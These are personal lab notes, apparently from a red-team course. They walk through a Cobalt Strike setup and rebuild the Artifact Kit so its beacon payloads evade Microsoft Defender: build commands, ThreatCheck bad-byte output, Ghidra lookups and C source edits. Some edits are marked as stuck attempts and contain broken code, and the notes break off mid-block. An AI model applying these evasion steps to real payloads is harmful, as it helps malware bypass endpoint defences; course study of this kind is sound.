# Cobalt Strike Setup 
created `custom.cotf` directory and am utilizing `cotf` malleable `/home/attacker/cobaltstrike/c2-profiles/custom.cotf/custom.profile`  [[2. COTF Cobaltstrike Profile]]

utilized `c2lint` to check to ensure it is working
```powershell
./c2lint /home/attacker/cobaltstrike/c2-profiles/custom.cotf/custom.profile
```
![[Pasted image 20240216110747.png]]
looks like its working, starting `teamserver`
![[Pasted image 20240216110857.png]]
opened `cobaltstrike`, utilized everything below in the screenshot the password is `passphrase`
![[Pasted image 20240216111013.png]]
# Listener Creation
creating `listeners` that were created in the course
![[Pasted image 20240216111620.png]]
# Generating Payloads
![[Pasted image 20240216111739.png]]
placed in `C:\Payloads`
![[Pasted image 20240216111826.png]]
# AMSI Bypass setup
[[Manual AMSI Bypass]] followed as well as a generic `AMSI` bypass below
generic `AMSI` failed
![[Pasted image 20240216112805.png]]
manual `AMSI` failed
![[Pasted image 20240216112849.png]]
going to have to build an `Artifact Kit` that bypasses Defender. going to build the `Resource Kit` as well to be safe.

# Artifact Kit build
[[2.1 unquoted_service_path_abuse_artifact_Kit]]
on `Attacker Desktop` navigated to `WSL` session and to `/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact` and utilized command below to begin the artifact kit build
- utilized to recompile all executables
```powershell
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
```
![[Pasted image 20240216113400.png]]
in a `powershell` session on `Attacker Desktop` utilize the command below to run `ThreatCheck` against the beacon executables.
- The file path for `threatcheck` is a bit different from what was in the course
```powershell
C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
```
results with `Real Time Threat Protection ` on - these aren't the correct bad bytes to chase
Making sure to turn off `Real Time Threat Protection` and running again.
```powershell
[!] Identified end of bad bytes at offset 0x2B562                                                                       
00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                         
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
00000090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
000000A0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
000000B0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
000000C0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
000000D0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
000000E0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················                                          
000000F0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················  
```
results with `Real Time Threat Protection` off - correct bad bytes
```powershell
PS C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug> C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] Target file size: 352256 bytes
[+] Analyzing...
[*] Testing 176128 bytes
[*] Threat found, splitting
[*] Testing 88064 bytes
[*] Threat found, splitting
[*] Testing 44032 bytes
[*] Threat found, splitting
[*] Testing 22016 bytes
[*] Threat found, splitting
[*] Testing 11008 bytes
[*] Threat found, splitting
[*] Testing 5504 bytes
[*] Threat found, splitting
[*] Testing 2752 bytes
[*] No threat found, increasing size
[*] Testing 177504 bytes
[*] Threat found, splitting
[*] Testing 90128 bytes
[*] Threat found, splitting
[*] Testing 46440 bytes
[*] Threat found, splitting
[*] Testing 24596 bytes
[*] Threat found, splitting
[*] Testing 13674 bytes
[*] Threat found, splitting
[*] Testing 8213 bytes
[*] Threat found, splitting
[*] Testing 5482 bytes
[*] Threat found, splitting
[*] Testing 4117 bytes
[*] Threat found, splitting
[*] Testing 3434 bytes
[*] Threat found, splitting
[*] Testing 3093 bytes
[*] Threat found, splitting
[*] Testing 2922 bytes
[*] No threat found, increasing size
[*] Testing 177589 bytes
[*] Threat found, splitting
[*] Testing 90255 bytes
[*] Threat found, splitting
[*] Testing 46588 bytes
[*] Threat found, splitting
[*] Testing 24755 bytes
[*] Threat found, splitting
[*] Testing 13838 bytes
[*] Threat found, splitting
[*] Testing 8380 bytes
[*] Threat found, splitting
[*] Testing 5651 bytes
[*] Threat found, splitting
[*] Testing 4286 bytes
[*] Threat found, splitting
[*] Testing 3604 bytes
[*] Threat found, splitting
[*] Testing 3263 bytes
[*] Threat found, splitting
[*] Testing 3092 bytes
[*] Threat found, splitting
[*] Testing 3007 bytes
[*] No threat found, increasing size
[*] Testing 177631 bytes
[*] Threat found, splitting
[*] Testing 90319 bytes
[*] Threat found, splitting
[*] Testing 46663 bytes
[*] Threat found, splitting
[*] Testing 24835 bytes
[*] Threat found, splitting
[*] Testing 13921 bytes
[*] Threat found, splitting
[*] Testing 8464 bytes
[*] Threat found, splitting
[*] Testing 5735 bytes
[*] Threat found, splitting
[*] Testing 4371 bytes
[*] Threat found, splitting
[*] Testing 3689 bytes
[*] Threat found, splitting
[*] Testing 3348 bytes
[*] Threat found, splitting
[*] Testing 3177 bytes
[*] Threat found, splitting
[*] Testing 3092 bytes
[*] Threat found, splitting
[*] Testing 3049 bytes
[*] Threat found, splitting
[*] Testing 3028 bytes
[*] No threat found, increasing size
[*] Testing 177642 bytes
[*] Threat found, splitting
[*] Testing 90335 bytes
[*] Threat found, splitting
[*] Testing 46681 bytes
[*] Threat found, splitting
[*] Testing 24854 bytes
[*] Threat found, splitting
[*] Testing 13941 bytes
[*] Threat found, splitting
[*] Testing 8484 bytes
[*] Threat found, splitting
[*] Testing 5756 bytes
[*] Threat found, splitting
[*] Testing 4392 bytes
[*] Threat found, splitting
[*] Testing 3710 bytes
[*] Threat found, splitting
[*] Testing 3369 bytes
[*] Threat found, splitting
[*] Testing 3198 bytes
[*] Threat found, splitting
[*] Testing 3113 bytes
[*] Threat found, splitting
[*] Testing 3070 bytes
[*] Threat found, splitting
[*] Testing 3049 bytes
[*] Threat found, splitting
[*] Testing 3038 bytes
[*] Threat found, splitting
[*] Testing 3033 bytes
[*] No threat found, increasing size
[*] Testing 177644 bytes
[*] Threat found, splitting
[*] Testing 90338 bytes
[*] Threat found, splitting
[*] Testing 46685 bytes
[*] Threat found, splitting
[*] Testing 24859 bytes
[*] Threat found, splitting
[*] Testing 13946 bytes
[*] Threat found, splitting
[*] Testing 8489 bytes
[*] Threat found, splitting
[*] Testing 5761 bytes
[*] Threat found, splitting
[*] Testing 4397 bytes
[*] Threat found, splitting
[*] Testing 3715 bytes
[*] Threat found, splitting
[*] Testing 3374 bytes
[*] Threat found, splitting
[*] Testing 3203 bytes
[*] Threat found, splitting
[*] Testing 3118 bytes
[*] Threat found, splitting
[*] Testing 3075 bytes
[*] Threat found, splitting
[*] Testing 3054 bytes
[*] Threat found, splitting
[*] Testing 3043 bytes
[*] Threat found, splitting
[*] Testing 3038 bytes
[*] Threat found, splitting
[*] Testing 3035 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xBDB
00000000   AB B9 06 00 00 00 4C 89  E7 4C 8D 05 15 29 05 00   «1····L?çL?··)··
00000010   F3 AB 4C 89 E9 C7 84 24  88 00 00 00 68 00 00 00   ó«L?éÇ?$?···h···
00000020   FF 15 4F 6D 05 00 45 31  C9 45 31 C0 31 C9 4C 89   ÿ·Om··E1ÉE1A1ÉL?
00000030   64 24 48 4C 89 EA 48 89  6C 24 40 48 C7 44 24 38   d$HL?êH?l$@HÇD$8
00000040   00 00 00 00 48 C7 44 24  30 00 00 00 00 C7 44 24   ····HÇD$0····ÇD$
00000050   28 04 00 00 00 C7 44 24  20 01 00 00 00 FF 15 9A   (····ÇD$ ····ÿ·?
00000060   6B 05 00 85 C0 74 32 48  8B 4C 24 70 48 85 C9 74   k··?At2H?L$pH?Ét
00000070   28 0F 10 44 24 70 48 8D  54 24 50 4C 63 CE 49 89   (··D$pH?T$PLcII?
00000080   D8 48 8B 84 24 80 00 00  00 0F 11 44 24 50 48 89   OH??$?·····D$PH?
00000090   44 24 60 E8 6E FE FF FF  90 48 81 C4 F8 04 00 00   D$`èn_ÿÿ?H?Äo···
000000A0   5B 5E 5F 5D 41 5C 41 5D  C3 57 56 48 83 EC 68 48   [^_]A\A]AWVH?ìhH
000000B0   8D 35 72 28 05 00 31 C0  49 89 C9 48 8D 7C 24 20   ?5r(··1AI?ÉH?|$
000000C0   B9 10 00 00 00 41 89 D2  F3 A5 4C 89 C2 4C 8D 44   1····A?Oó¥L?AL?D
000000D0   24 20 48 89 C1 83 E1 07  8A 0C 0A 41 30 0C 00 48   $ H?A?á·?··A0··H
000000E0   FF C0 48 83 F8 40 75 EA  31 C0 41 39 C2 7E 12 48   ÿAH?o@uê1AA9A~·H
000000F0   89 C1 83 E1 07 8A 0C 0A  41 30 0C 01 48 FF C0 EB   ?A?á·?··A0··HÿAë

[*] Run time: 10.2s
PS C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug>
```
opening `GHIDRA` in this path on `Attacker Desktop` `C:\Tools\ghidra-10.3.1`

created a new project name `beacon`
![[Pasted image 20240216114525.png]]
right click on the new project name and click `import file` and navigate to the path in the picture below and select `artifact64svcbig.exe` - I believe that it doesn't matter which executable you use.
![[Pasted image 20240216114808.png]]
open up the `.exe` by double clicking it and hit `yes` to analyze - default options should be good
![[Pasted image 20240216115022.png]]
`navigation -> Go to...` didnt work to find the bad bytes
![[Pasted image 20240216115139.png]]
pulled the `HEX` sequence `89 C1 83 E1 07 8A 0C 0A  41 30 0C 01 48 FF C0 EB` and utilize the `Search > Memory` to find the proper location
![[Pasted image 20240216115411.png]]
double click the location to be taken to the location
takes us to a location that is identical to the course material
![[Pasted image 20240216115502.png]]
open `Visual Studio Code` with the file location `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\patch.c`
- once it is opened utilize `CTRL-F` to search for `for` because it is in the memory location found in `ghidra`
in the course the portion highlighted is the portion that was changed, going to change it again
![[Pasted image 20240216120438.png]]
original - unmodified
```powershell
   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
      *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];  // 8 byte XoR
   }
```
changed - modified
line 44-52
```powershell
   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
      char* ptr = (char *)buffer + x;  // 8 byte XoR

      /* do something random */
      GetTickCount();

      *ptr = *ptr ^ key[x % 8];
   }
```
![[Pasted image 20240216120734.png]]
`saved` the file in `visual studio code`

reopen the `WSL` session to rebuild the code utilizing the same command as before
```powershell
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobalt
strike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
![[Pasted image 20240216121027.png]]
open `Powershell` session on `Attacker Desktop` and utilize the `ThreatCheck` command to identify the next set of bad bytes
```powershell
PS C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug> C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] Target file size: 352256 bytes
[+] Analyzing...
[*] Testing 176128 bytes
[*] Threat found, splitting
[*] Testing 88064 bytes
[*] Threat found, splitting
[*] Testing 44032 bytes
[*] Threat found, splitting
[*] Testing 22016 bytes
[*] Threat found, splitting
[*] Testing 11008 bytes
[*] Threat found, splitting
[*] Testing 5504 bytes
[*] Threat found, splitting
[*] Testing 2752 bytes
[*] No threat found, increasing size
[*] Testing 177504 bytes
[*] Threat found, splitting
[*] Testing 90128 bytes
[*] Threat found, splitting
[*] Testing 46440 bytes
[*] Threat found, splitting
[*] Testing 24596 bytes
[*] Threat found, splitting
[*] Testing 13674 bytes
[*] Threat found, splitting
[*] Testing 8213 bytes
[*] Threat found, splitting
[*] Testing 5482 bytes
[*] Threat found, splitting
[*] Testing 4117 bytes
[*] Threat found, splitting
[*] Testing 3434 bytes
[*] No threat found, increasing size
[*] Testing 177845 bytes
[*] Threat found, splitting
[*] Testing 90639 bytes
[*] Threat found, splitting
[*] Testing 47036 bytes
[*] Threat found, splitting
[*] Testing 25235 bytes
[*] Threat found, splitting
[*] Testing 14334 bytes
[*] Threat found, splitting
[*] Testing 8884 bytes
[*] Threat found, splitting
[*] Testing 6159 bytes
[*] Threat found, splitting
[*] Testing 4796 bytes
[*] Threat found, splitting
[*] Testing 4115 bytes
[*] Threat found, splitting
[*] Testing 3774 bytes
[*] Threat found, splitting
[*] Testing 3604 bytes
[*] No threat found, increasing size
[*] Testing 177930 bytes
[*] Threat found, splitting
[*] Testing 90767 bytes
[*] Threat found, splitting
[*] Testing 47185 bytes
[*] Threat found, splitting
[*] Testing 25394 bytes
[*] Threat found, splitting
[*] Testing 14499 bytes
[*] Threat found, splitting
[*] Testing 9051 bytes
[*] Threat found, splitting
[*] Testing 6327 bytes
[*] Threat found, splitting
[*] Testing 4965 bytes
[*] Threat found, splitting
[*] Testing 4284 bytes
[*] Threat found, splitting
[*] Testing 3944 bytes
[*] Threat found, splitting
[*] Testing 3774 bytes
[*] Threat found, splitting
[*] Testing 3689 bytes
[*] Threat found, splitting
[*] Testing 3646 bytes
[*] No threat found, increasing size
[*] Testing 177951 bytes
[*] Threat found, splitting
[*] Testing 90798 bytes
[*] Threat found, splitting
[*] Testing 47222 bytes
[*] Threat found, splitting
[*] Testing 25434 bytes
[*] Threat found, splitting
[*] Testing 14540 bytes
[*] Threat found, splitting
[*] Testing 9093 bytes
[*] Threat found, splitting
[*] Testing 6369 bytes
[*] Threat found, splitting
[*] Testing 5007 bytes
[*] Threat found, splitting
[*] Testing 4326 bytes
[*] Threat found, splitting
[*] Testing 3986 bytes
[*] Threat found, splitting
[*] Testing 3816 bytes
[*] Threat found, splitting
[*] Testing 3731 bytes
[*] Threat found, splitting
[*] Testing 3688 bytes
[*] Threat found, splitting
[*] Testing 3667 bytes
[*] No threat found, increasing size
[*] Testing 177961 bytes
[*] Threat found, splitting
[*] Testing 90814 bytes
[*] Threat found, splitting
[*] Testing 47240 bytes
[*] Threat found, splitting
[*] Testing 25453 bytes
[*] Threat found, splitting
[*] Testing 14560 bytes
[*] Threat found, splitting
[*] Testing 9113 bytes
[*] Threat found, splitting
[*] Testing 6390 bytes
[*] Threat found, splitting
[*] Testing 5028 bytes
[*] Threat found, splitting
[*] Testing 4347 bytes
[*] Threat found, splitting
[*] Testing 4007 bytes
[*] Threat found, splitting
[*] Testing 3837 bytes
[*] Threat found, splitting
[*] Testing 3752 bytes
[*] Threat found, splitting
[*] Testing 3709 bytes
[*] Threat found, splitting
[*] Testing 3688 bytes
[*] Threat found, splitting
[*] Testing 3677 bytes
[*] No threat found, increasing size
[*] Testing 177966 bytes
[*] Threat found, splitting
[*] Testing 90821 bytes
[*] Threat found, splitting
[*] Testing 47249 bytes
[*] Threat found, splitting
[*] Testing 25463 bytes
[*] Threat found, splitting
[*] Testing 14570 bytes
[*] Threat found, splitting
[*] Testing 9123 bytes
[*] Threat found, splitting
[*] Testing 6400 bytes
[*] Threat found, splitting
[*] Testing 5038 bytes
[*] Threat found, splitting
[*] Testing 4357 bytes
[*] Threat found, splitting
[*] Testing 4017 bytes
[*] Threat found, splitting
[*] Testing 3847 bytes
[*] Threat found, splitting
[*] Testing 3762 bytes
[*] Threat found, splitting
[*] Testing 3719 bytes
[*] Threat found, splitting
[*] Testing 3698 bytes
[*] Threat found, splitting
[*] Testing 3687 bytes
[*] Threat found, splitting
[*] Testing 3682 bytes
[*] No threat found, increasing size
[*] Testing 177969 bytes
[*] Threat found, splitting
[*] Testing 90825 bytes
[*] Threat found, splitting
[*] Testing 47253 bytes
[*] Threat found, splitting
[*] Testing 25467 bytes
[*] Threat found, splitting
[*] Testing 14574 bytes
[*] Threat found, splitting
[*] Testing 9128 bytes
[*] Threat found, splitting
[*] Testing 6405 bytes
[*] Threat found, splitting
[*] Testing 5043 bytes
[*] Threat found, splitting
[*] Testing 4362 bytes
[*] Threat found, splitting
[*] Testing 4022 bytes
[*] Threat found, splitting
[*] Testing 3852 bytes
[*] Threat found, splitting
[*] Testing 3767 bytes
[*] Threat found, splitting
[*] Testing 3724 bytes
[*] Threat found, splitting
[*] Testing 3703 bytes
[*] Threat found, splitting
[*] Testing 3692 bytes
[*] Threat found, splitting
[*] Testing 3687 bytes
[*] Threat found, splitting
[*] Testing 3684 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xE64
00000000   89 C4 31 C0 49 83 FC FF  74 3E 85 DB 7E 1F 49 89   ?Ä1AI?üÿt>?U~·I?
00000010   F9 41 89 D8 48 89 F2 4C  89 E1 48 C7 44 24 20 00   ùA?OH?òL?áHÇD$ ·
00000020   00 00 00 FF 15 CB 69 05  00 85 C0 75 10 4C 89 E1   ···ÿ·Ei··?Au·L?á
00000030   FF 15 1E 69 05 00 B8 01  00 00 00 EB 0B 8B 54 24   ÿ··i··,····ë·?T$
00000040   4C 48 01 D6 29 D3 EB C2  48 83 C4 58 5B 5E 5F 41   LH·Ö)OëAH?ÄX[^_A
00000050   5C C3 41 54 56 53 48 83  EC 20 48 8B 1D AB 2E 05   \AATVSH?ì H?·«.·
00000060   00 48 63 4B 04 E8 DA 5D  00 00 48 8B 35 A3 69 05   ·HcK·èU]··H?5£i·
00000070   00 49 89 C4 B9 00 04 00  00 FF D6 8B 53 04 4C 89   ·I?Ä1····ÿÖ?S·L?
00000080   E1 E8 2A FF FF FF 85 C0  74 EA 8B 53 04 4C 8D 43   áè*ÿÿÿ?Atê?S·L?C
00000090   08 4C 89 E1 E8 87 FD FF  FF 4C 89 E1 E8 BB 5D 00   ·L?áè?yÿÿL?áè»]·
000000A0   00 31 C0 48 83 C4 20 5B  5E 41 5C C3 48 83 EC 68   ·1AH?Ä [^A\AH?ìh
000000B0   FF 15 16 69 05 00 B9 AA  26 00 00 31 D2 41 B9 5C   ÿ··i··1ª&··1OA1\
000000C0   00 00 00 F7 F1 C7 44 24  50 5C 00 00 00 C7 44 24   ···÷ñÇD$P\···ÇD$
000000D0   48 65 00 00 00 C7 44 24  40 70 00 00 00 C7 44 24   He···ÇD$@p···ÇD$
000000E0   38 69 00 00 00 C7 44 24  30 70 00 00 00 C7 44 24   8i···ÇD$0p···ÇD$
000000F0   28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C   (\···ÇD$ .···A,\

[*] Run time: 12.33s
```
![[Pasted image 20240216121241.png]]
utilize the hex in the bad bytes above `28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C` to find next function that needs to be changed
![[Pasted image 20240216121414.png]]
new function found
![[Pasted image 20240216121601.png]]
I believe that I found the location that needs to be changed, this is different than course material so i'm going to save the original line just in case I screw it up
## Was Stuck Here
```powershell
char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}
```
before changes
![[Pasted image 20240216122506.png]]
after changes
```powershell
char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0 || payload->bugs_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;
   void * bugs_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
   memcpy(buffer + payload->bugs_offset, &bugs_addr, sizeof(void *));
}
```
after 2nd changes
```powershell
void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->bugs_offset <= 0 || payload->bugs_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->bugs_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->bugs_offset, &gpa_addr, sizeof(void *));
}
```
after 3rd changes
```powershell
char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->bugs_offset <= 0 || payload->bugs_offset <= 0)
      return;

   void * bugs_addr = (void *)GetProcAddress;
   void * bugs_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->bugs_offset, &bugs_addr, sizeof(void *));
   memcpy(buffer + payload->bugs_offset, &bugs_addr, sizeof(void *));
}
```


searched `89 C4 31 C0 49 83 FC FF  74 3E 85 DB 7E 1F 49 89` instead in ghidra and got a different function
![[Pasted image 20240216124417.png]]
![[Pasted image 20240216124432.png]]



### Video to get unstuck
utilized the walkthrough of `Artifact Kit` to find that this exact portion was in the video.

refreshed my `Ghidra` and looked up `28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C` again. the Function call that makes it identifiable is the `CreateThread`
![[Pasted image 20240216131022.png]]
the code that needs to be changed is right above it on line 119 through 122, this same was also modified in the course video.

original
```c
   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {
